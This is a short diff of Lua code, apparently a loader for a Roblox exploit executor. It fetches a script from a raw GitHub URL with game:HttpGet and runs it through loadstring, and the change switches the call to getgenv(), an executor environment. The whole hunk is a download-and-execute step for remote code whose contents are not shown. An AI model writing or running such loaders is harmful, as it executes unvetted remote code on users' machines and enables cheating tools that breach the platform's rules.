@@ -6,6 +6,6 @@
 v0 = game["HttpGet"];
 v1 = "https://raw.githubusercontent.com/getrawmetatable/Razer.X/razer-.-x-%25/.lua";
 v2 = v0(v1)
-v3 = _G["loadstring"];
+v3 = getgenv()["loadstring"];
 v3(v2)();
 ```
